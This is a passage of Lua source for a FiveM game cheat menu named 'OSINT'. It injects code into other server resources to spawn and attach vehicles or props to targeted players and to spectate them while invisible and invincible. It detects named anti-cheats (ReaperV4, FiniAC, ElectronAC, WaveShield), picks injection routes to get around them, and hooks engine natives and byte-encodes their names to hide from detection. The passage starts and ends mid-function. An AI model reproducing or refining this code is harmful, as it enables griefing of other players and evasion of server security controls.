                    end
                    local model = decode({%s})
                    RequestModel(model)
                    local maxAttempts = 20
                    local attempts = 0
                    while not HasModelLoaded(model) and attempts < maxAttempts do
                        Citizen.Wait(500)
                        attempts = attempts + 1
                    end
                    if attempts >= maxAttempts then return end
                    
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    
                    local coords = GetEntityCoords(ped)
                    local heading = GetEntityHeading(ped)
                    local vehicle = CreateVehicle(model, coords.x, coords.y, coords.z, heading, true, true)
                    if vehicle and DoesEntityExist(vehicle) then
                        AttachEntityToEntity(vehicle, ped, 0, 0.0, 0.8, 0.0, 0.0, 180.0, 0.0, false, false, true, false, 0, true)
                        SetPedIntoVehicle(ped, vehicle, -1)
                        SetModelAsNoLongerNeeded(model)
                    end
                ]], modelBytes, playerId)
                MachoInjectResourceRaw("any", script, playerId)
            end)
            if success then successCount = successCount + 1 end
        end
    end
end


function encodeToByteArrayLiteral(str)
    if not str then return "" end
    if type(str) ~= "string" then
        return tostring(str)
    end
    if #str == 0 then return "" end
    local bytes = {}
    for i = 1, #str do
        bytes[#bytes + 1] = tostring(string.byte(str, i))
    end
    return table.concat(bytes, ", ")
end

function OSINT:SpawnSelectedObject(playerIds)
    if not playerIds or #playerIds == 0 then
        self:Notify("error", "OSINT", "No players selected!", 3000)
        return
    end
    local model = self:GetSelectedObjectModel()
    if not model or #model == 0 then
        self:Notify("error", "OSINT", "Invalid object model!", 3000)
        return
    end
    local modelBytes = encodeToByteArrayLiteral(model)
    local successCount = 0
    for _, playerId in ipairs(playerIds) do
        if GetResourceState("qb-core") == "started" or GetResourceState("mc9-core") == "started" and
        (GetResourceState("ElectronAC") == "started" or
            GetResourceState("FiniAC") == "started" or
            GetResourceState("ReaperV4") == "started" or
            GetResourceState("WaveShield") == "started") then
            self:Notify("error", "OSINT", "Using Qb-core Spawner!", 3000)
            MachoInjectResource("qb-core", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and joaat(model) or model
                QBCore.Functions.LoadModel(hash)
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("cd_dispatch") == "started" then
            print("using fallback")
            -- Dedicated cd_dispatch branch: Hook CreateObject for hash override and model loading
            MachoInjectResource("cd_dispatch", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                
                -- Hook CreateObject to override hash and ensure model loading
                local originalCreateObject = CreateObject
                CreateObject = function(objHash, x, y, z, dynamic, placeOnGround, p7)
                    if type(objHash) == 'number' and objHash ~= hash then
                        -- Override with our custom hash for this spawn
                        objHash = hash
                    end
                    RequestModel(objHash)
                    while not HasModelLoaded(objHash) do
                        Citizen.Wait(0)
                    end
                    local obj = originalCreateObject(objHash, x, y, z, dynamic, placeOnGround, p7)
                    SetModelAsNoLongerNeeded(objHash)
                    return obj
                end
                
                -- Spawn the object on target player
                local player = GetPlayerFromServerId(%d)
                if player == -1 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then 
                    CreateObject = originalCreateObject
                    return 
                end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                end
                
                -- Restore original CreateObject
                CreateObject = originalCreateObject
            ]], modelBytes, playerId))
            successCount = successCount + 1
        elseif GetResourceState("rcore_drunk") == "started" then
            MachoInjectResourceRaw("rcore_drunk", string.format([[
                local model = "%s"
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local hash = GetHashKey(model)
                RequestModel(hash)
                while not HasModelLoaded(hash) do Citizen.Wait(0) end
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("lc_fuel") == "started" then
            MachoInjectResourceRaw("lc_fuel", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    Config.NozzleProps.gas = model
                    local entity = createFuelNozzleObject()
                    SetEntityCoords(entity, coords)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("0r-illegalpack") == "started" then
            MachoInjectResourceRaw("0r-illegalpack", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    local entity = Utils.createObject(model, coords, vec3(0.0, 0.0, 0.0), true, true, false)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        elseif GetResourceState("xradio") == "started" then
            MachoInjectResourceRaw("xradio", string.format([[
                local function spawnObj()
                    local model = "%s"
                    local player = GetPlayerFromServerId(%d)
                    if player == -1 then return end
                    local ped = GetPlayerPed(player)
                    if not ped or ped == 0 then return end
                    local coords = GetEntityCoords(ped)
                    CreateRadioObject(model, coords, function(entity)
                        print(entity)
                    end)
                end
                spawnObj()
            ]], model, playerId))
            successCount = successCount + 1
        else
            MachoInjectResourceRaw("any", string.format([[
                local function decode(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local model = decode({%s})
                local hash = type(model) == 'string' and GetHashKey(model) or model
                RequestModel(hash)
                local attempts = 0
                while not HasModelLoaded(hash) and attempts < 20 do
                    Citizen.Wait(100)
                    attempts = attempts + 1
                end
                if attempts >= 20 then return end
                local player = GetPlayerFromServerId(%d)
                if player == -1 then return end
                local ped = GetPlayerPed(player)
                if not ped or ped == 0 then return end
                local coords = GetEntityCoords(ped)
                local obj = CreateObject(hash, coords.x, coords.y, coords.z + 0.5, true, true, true)
                if obj and DoesEntityExist(obj) then
                    AttachEntityToEntity(obj, ped, 0, 0.0, 0.5, 0.0, 0.0, 0.0, 0.0, false, false, true, false, 0, true)
                    SetModelAsNoLongerNeeded(hash)
                end
            ]], modelBytes, playerId))
            successCount = successCount + 1
        end
    end
    self:Notify("success", "OSINT", string.format("Object '%s' spawned on %d/%d player(s)!", model, successCount, #playerIds), 5000)
end

function OSINT:HandleSpectateToggle(playerId, enabled)
    if not playerId then
        self:Notify("error", "OSINT", "Invalid player ID provided!", 3000)
        return
    end
    local targetServerId = tonumber(playerId)
    if not targetServerId then
        self:Notify("error", "OSINT", "Invalid server ID format!", 3000)
        return
    end
    if targetServerId == tonumber(GetPlayerServerId(PlayerId())) then
        self:Notify("error", "OSINT", "You cannot spectate yourself!", 3000)
        return
    end
    if enabled then
        self:Notify("success", "OSINT", ("You have started spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
    else
        self:Notify("error", "OSINT", ("You have stopped spectating the player %s - [%s]!"):format(GetPlayerName(GetPlayerFromServerId(targetServerId)) or "Unknown", targetServerId), 3000)
    end
    local reaper = GetResourceState('ReaperV4') == 'started'

    if reaper then
        print('Spectate Fallback #3 (ReaperV4 detected, running direct)')
        if not GetPlayerName(GetPlayerFromServerId(targetServerId)) then
            self:Notify("error", "OSINT", "Target player not found!", 3000)
            print("[ReaperV4 Spectate] Error: No player found for server ID:", targetServerId)
            return
        end
        local code = string.format([[
            local function HookNative(nativeName, newFunction)
                local originalNative = _G[nativeName]
                if not originalNative or type(originalNative) ~= "function" then
                    print("[ReaperV4 Spectate] Warning: Native " .. nativeName .. " not found or not a function")
                    return
                end
                _G[nativeName] = function(...)
                    return newFunction(originalNative, ...)
                end
            end
            local function _b(str)
                local t = {}
                for i = 1, #str do t[i] = string.byte(str, i) end
                return t
            end
            local function _d(tbl)
                local s = ""
                for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                return s
            end
            local function _g(n)
                local k = _d(n)
                local f = _G[k]
                if not f then print("[ReaperV4 Spectate] Error: Global function " .. k .. " not found") end
                return f
            end
            local function _w(n)
                return Citizen.Wait(n)
            end
            local function _t()
                local createThread = _G[_d(_b("CreateThread"))]
                if not createThread then print("[ReaperV4 Spectate] Error: CreateThread not found") end
                return createThread
            end
            HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
            HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
            HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
            HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
            HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
            HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
            local function findClientIdByServerId(sid)
                local players = _g(_b("GetActivePlayers"))()
                if not players then
                    print("[ReaperV4 Spectate] Error: GetActivePlayers returned nil")
                    return -1
                end
                print("[ReaperV4 Spectate] Active players:", table.concat(players, ", "))
                for _, pid in ipairs(players) do
                    local serverId = _g(_b("GetPlayerServerId"))(pid)
                    print("[ReaperV4 Spectate] Player Client ID:", pid, "Server ID:", serverId)
                    if serverId == sid then
                        print("[ReaperV4 Spectate] Found client ID:", pid, "for server ID:", sid)
                        return pid
                    end
                end
                print("[ReaperV4 Spectate] Error: No client ID found for server ID:", sid)
                return -1
            end
            local function stopSpectate()
                if not _G.osintSpectate or not _G.osintSpectate.enabled then
                    print("[ReaperV4 Spectate] StopSpectate: Not currently spectating")
                    return
                end
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local back = _G.osintSpectate.back
                local heading = _G.osintSpectate.heading
                local wasVisible = _G.osintSpectate.wasVisible
                if back then
                    _g(_b("RequestCollisionAtCoord"))(back.x, back.y, back.z)
                end
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                end
                _g(_b("FreezeEntityPosition"))(me, false)
                if back then
                    _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true)
                end
                if heading then
                    _g(_b("SetEntityHeading"))(me, heading)
                end
                _g(_b("SetEntityCollision"))(me, true, true)
                _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                _g(_b("SetEntityInvincible"))(me, false)
                _G.osintSpectate.enabled = false
                _G.osintSpectate.targetSid = nil
                print("[ReaperV4 Spectate] Stopped spectating")
            end
            local function startSpectate(targetSid)
                local me = _g(_b("PlayerPedId"))()
                if not me then
                    print("[ReaperV4 Spectate] Error: PlayerPedId returned nil")
                    return
                end
                local myCoords = _g(_b("GetEntityCoords"))(me)
                if not myCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil")
                    return
                end
                local myHeading = _g(_b("GetEntityHeading"))(me)
                if not _G.osintSpectate then _G.osintSpectate = {} end
                _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                _G.osintSpectate.heading = myHeading
                _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                _G.osintSpectate.enabled = true
                _G.osintSpectate.targetSid = targetSid
                local clientId = findClientIdByServerId(targetSid)
                local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                if clientId == -1 or targetPed == 0 then
                    print("[ReaperV4 Spectate] Error: Invalid client ID or target ped not found for server ID:", targetSid)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('OSINT:Notify', "error", "OSINT", "Target player not found!", 3000)
                    return
                end
                local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                if not tCoords then
                    print("[ReaperV4 Spectate] Error: GetEntityCoords for target ped returned nil")
                    _G.osintSpectate.enabled = false
                    TriggerEvent('OSINT:Notify', "error", "OSINT", "Failed to get target position!", 3000)
                    return
                end
                _g(_b("RequestCollisionAtCoord"))(tCoords.x, tCoords.y, tCoords.z)
                _g(_b("SetEntityVisible"))(me, false, false)
                _g(_b("SetEntityCollision"))(me, false, false)
                _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                _g(_b("SetEntityInvincible"))(me, true)
                local zOffset = 15.0 -- Default offset since GetGroundZFor_3dCoord is unavailable
                _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z + zOffset, false, false, false, true)
                _w(300)
                _g(_b("FreezeEntityPosition"))(me, true)
                local success, err = pcall(function()
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                end)
                if not success then
                    print("[ReaperV4 Spectate] Error: NetworkSetInSpectatorMode failed:", err)
                    _G.osintSpectate.enabled = false
                    TriggerEvent('OSINT:Notify', "error", "OSINT", "Spectator mode not supported!", 3000)
                    return
                end
                print("[ReaperV4 Spectate] Started spectating server ID:", targetSid, "on ped:", targetPed)
                _t()(function()
                    while _G.osintSpectate and _G.osintSpectate.enabled do
                        local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                        if cid == -1 then
                            print("[ReaperV4 Spectate] Error: Client ID not found in loop for server ID:", targetSid)
                            break
                        end
                        local ped = _g(_b("GetPlayerPed"))(cid)
                        if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then
                            print("[ReaperV4 Spectate] Error: Target ped not found or does not exist")
                            break
                        end
                        local pc = _g(_b("GetEntityCoords"))(ped)
                        if not pc then
                            print("[ReaperV4 Spectate] Error: GetEntityCoords returned nil in loop")
                            break
                        end
                        _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z + zOffset, false, false, false, true)
                        _w(400)
                    end
                    stopSpectate()
                end)
            end
            local enable = %s
            local sid = %d
            if enable then
                print("[ReaperV4 Spectate] Starting spectate for server ID:", sid)
                startSpectate(sid)
            else
                print("[ReaperV4 Spectate] Stopping spectate")
                stopSpectate()
            end
        ]], tostring(enabled), targetServerId)

        local fn, err = load(code)
        if fn then
            local success, result = pcall(fn)
            if not success then
                print("[ReaperV4 Spectate] Execution error:", result)
                self:Notify("error", "OSINT", "Failed to execute spectate code!", 3000)
            else
                print("[ReaperV4 Spectate] Code executed successfully")
            end
        else
            print("[ReaperV4 Spectate] Load error:", err)
            self:Notify("error", "OSINT", "Failed to load spectate code!", 3000)
        end
    else
        if GetResourceState('FiniAC') == 'started' or GetResourceState('ElectronAC') == 'started' then
            print('Spectate Fallback #1')
            MachoInjectResourceRaw("any", string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("CreateCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("RenderScriptCams", function(originalFn, ...) return originalFn(...) end)
                HookNative("DestroyCam", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusEntity", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetCamRot", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetDisabledControlNormal", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetFocusPosAndVel", function(originalFn, ...) return originalFn(...) end)
                local function Clamp(val, min, max)
                    if val < min then return min end
                    if val > max then return max end
                    return val
                end
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if _G.osintSpectate.camera then
                        _g(_b("RenderScriptCams"))(false, false, 0, true, true)
                        _g(_b("DestroyCam"))(_G.osintSpectate.camera, false)
                        _G.osintSpectate.camera = nil
                    end
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then
                        local valid, groundZ = _g(_b("GetGroundZFor_3dCoord"))(back.x, back.y, back.z, false)
                        local targetCoords = valid and vector3(back.x, back.y, groundZ + 1.0) or back
                        _g(_b("SetEntityCoords"))(me, targetCoords.x, targetCoords.y, targetCoords.z, false, false, false, true)
                    end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                    _g(_b("SetFocusEntity"))(me)
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local zOffset = 3.0
                    local cam = _g(_b("CreateCam"))("DEFAULT_SCRIPTED_CAMERA", true)
                    _G.osintSpectate.camera = cam
                    _g(_b("SetCamCoord"))(cam, tCoords.x, tCoords.y, tCoords.z + zOffset)
                    _g(_b("SetCamRot"))(cam, -30.0, 0.0, _g(_b("GetEntityHeading"))(targetPed), 2)
                    _g(_b("RenderScriptCams"))(true, false, 0, true, true)
                    _t()(function()
                        local cameraReady = false
                        _w(550)
                        cameraReady = true
                        while _G.osintSpectate and _G.osintSpectate.enabled and cameraReady do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            _g(_b("SetCamCoord"))(cam, pc.x, pc.y, pc.z + zOffset)
                            local camRot = _g(_b("GetCamRot"))(cam, 2)
                            local x = _g(_b("GetDisabledControlNormal"))(0, 1)
                            local y = _g(_b("GetDisabledControlNormal"))(0, 2)
                            local newPitch = Clamp(camRot.x - y * 5, -89.0, 89.0)
                            local newYaw = camRot.z - x * 5
                            _g(_b("SetCamRot"))(cam, newPitch, camRot.y, newYaw, 2)
                            _g(_b("SetFocusPosAndVel"))(pc.x, pc.y, pc.z, 0.0, 0.0, 0.0)
                            _w(0)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]], tostring(enabled), targetServerId))
        else
            print('Spectate Fallback #2')
            MachoInjectResourceRaw("monitor", string.format([[
                local function HookNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                local function _b(str)
                    local t = {}
                    for i = 1, #str do t[i] = string.byte(str, i) end
                    return t
                end
                local function _d(tbl)
                    local s = ""
                    for i = 1, #tbl do s = s .. string.char(tbl[i]) end
                    return s
                end
                local function _g(n)
                    local k = _d(n)
                    local f = _G[k]
                    return f
                end
                local function _w(n)
                    return Citizen.Wait(n)
                end
                local function _t()
                    return _G[_d(_b("CreateThread"))]
                end
                HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetActivePlayers", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerServerId", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetPlayerPed", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("RequestCollisionAtCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetInSpectatorMode", function(originalFn, ...) return originalFn(...) end)
                HookNative("FreezeEntityPosition", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCoords", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityCollision", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("NetworkSetEntityInvisibleToNetwork", function(originalFn, ...) return originalFn(...) end)
                HookNative("SetEntityInvincible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetGroundZFor_3dCoord", function(originalFn, ...) return originalFn(...) end)
                HookNative("DoesEntityExist", function(originalFn, ...) return originalFn(...) end)
                HookNative("IsEntityVisible", function(originalFn, ...) return originalFn(...) end)
                HookNative("GetEntityHeading", function(originalFn, ...) return originalFn(...) end)
                local function findClientIdByServerId(sid)
                    local players = _g(_b("GetActivePlayers"))()
                    for _, pid in ipairs(players) do
                        if _g(_b("GetPlayerServerId"))(pid) == sid then
                            return pid
                        end
                    end
                    return -1
                end
                local function stopSpectate()
                    if not _G.osintSpectate or not _G.osintSpectate.enabled then return end
                    local me = _g(_b("PlayerPedId"))()
                    local back = _G.osintSpectate.back
                    local heading = _G.osintSpectate.heading
                    local wasVisible = _G.osintSpectate.wasVisible
                    if back then _g(_b("RequestCollisionAtCoord"))(back) end
                    _g(_b("NetworkSetInSpectatorMode"))(false, me)
                    _g(_b("FreezeEntityPosition"))(me, false)
                    if back then _g(_b("SetEntityCoords"))(me, back.x, back.y, back.z, false, false, false, true) end
                    if heading then _g(_b("SetEntityHeading"))(me, heading) end
                    _g(_b("SetEntityCollision"))(me, true, true)
                    _g(_b("SetEntityVisible"))(me, wasVisible == nil and true or wasVisible)
                    _G.osintSpectate.enabled = false
                    _G.osintSpectate.targetSid = nil
                end
                local function startSpectate(targetSid)
                    local me = _g(_b("PlayerPedId"))()
                    local myCoords = _g(_b("GetEntityCoords"))(me)
                    local myHeading = _g(_b("GetEntityHeading"))(me)
                    if not _G.osintSpectate then _G.osintSpectate = {} end
                    _G.osintSpectate.back = vec3(myCoords.x, myCoords.y, myCoords.z - 1.0)
                    _G.osintSpectate.heading = myHeading
                    _G.osintSpectate.wasVisible = _g(_b("IsEntityVisible"))(me)
                    _G.osintSpectate.enabled = true
                    _G.osintSpectate.targetSid = targetSid
                    local clientId = findClientIdByServerId(targetSid)
                    local targetPed = (clientId ~= -1) and _g(_b("GetPlayerPed"))(clientId) or 0
                    if clientId == -1 or targetPed == 0 then
                        _G.osintSpectate.enabled = false
                        return
                    end
                    local tCoords = _g(_b("GetEntityCoords"))(targetPed)
                    _g(_b("RequestCollisionAtCoord"))(tCoords)
                    _g(_b("SetEntityVisible"))(me, false, false)
                    _g(_b("SetEntityCollision"))(me, false, false)
                    _g(_b("NetworkSetEntityInvisibleToNetwork"))(me, true)
                    _g(_b("SetEntityInvincible"))(me, true)
                    local groundZ = tCoords.z
                    local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(tCoords.x, tCoords.y, tCoords.z, false)
                    if foundGround then
                        groundZ = zPos
                    end
                    local zOffset = math.max(15.0, tCoords.z - groundZ + 5.0)
                    _g(_b("SetEntityCoords"))(me, tCoords.x, tCoords.y, tCoords.z - zOffset, false, false, false, true)
                    _w(300)
                    _g(_b("FreezeEntityPosition"))(me, true)
                    _g(_b("NetworkSetInSpectatorMode"))(true, targetPed)
                    _t()(function()
                        while _G.osintSpectate and _G.osintSpectate.enabled do
                            local cid = findClientIdByServerId(_G.osintSpectate.targetSid or targetSid)
                            if cid == -1 then break end
                            local ped = _g(_b("GetPlayerPed"))(cid)
                            if not ped or ped == 0 or not _g(_b("DoesEntityExist"))(ped) then break end
                            local pc = _g(_b("GetEntityCoords"))(ped)
                            local groundZ = pc.z
                            local foundGround, zPos = _g(_b("GetGroundZFor_3dCoord"))(pc.x, pc.y, pc.z, false)
                            if foundGround then
                                groundZ = zPos
                            end
                            local zOffset = math.max(15.0, pc.z - groundZ + 5.0)
                            _g(_b("SetEntityCoords"))(me, pc.x, pc.y, pc.z - zOffset, false, false, false, true)
                            _w(400)
                        end
                        stopSpectate()
                    end)
                end
                local enable = %s
                local sid = %d
                if enable then
                    startSpectate(sid)
                else
                    stopSpectate()
                end
            ]], tostring(enabled), targetServerId))
        end
    end
end

local enviFallbackResources = {
    "envi-medic",
    "envi-hud",
    "envi-yoga",
    "envi-chopshop",
    "envi-chopshop-v2",
    "envi-foodtrucks",
    "envi-dumpsters",
    "envi-prescriptions",
    "envi-druglabs",
    "lation_laundering"
}

local function enviGetStartedFallbackResource()
    for i, res in ipairs(enviFallbackResources) do
        if GetResourceState(res) == "started" then
            return res
        end
    end
    return nil
end

local targetResource = nil
if GetResourceState("es_extended") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "es_extended"
elseif GetResourceState("core") == "started" and GetResourceState("timeless-emotes") == "started" then
    targetResource = "core"
end

function OSINT:EnableInvisibility()
    local function HookNative(nativeName, newFunction)
        local originalNative = _G[nativeName]
        if not originalNative or type(originalNative) ~= "function" then
            return
        end
        _G[nativeName] = function(...)
            return newFunction(originalNative, ...)
        end
    end
    
    HookNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
    HookNative("PlayerPedId", function(originalFn, ...) return originalFn(...) end)
    HookNative("IsEntityVisible", function(originalFn, ...) return true end)
    HookNative("IsEntityVisibleToScript", function(originalFn, ...) return true end)
    HookNative("SetEntityVisible", function(originalFn, ped, toggle, unk)
        if _G.osintInvisibility and _G.osintInvisibility.enabled then
            return originalFn(ped, false, unk)
        end
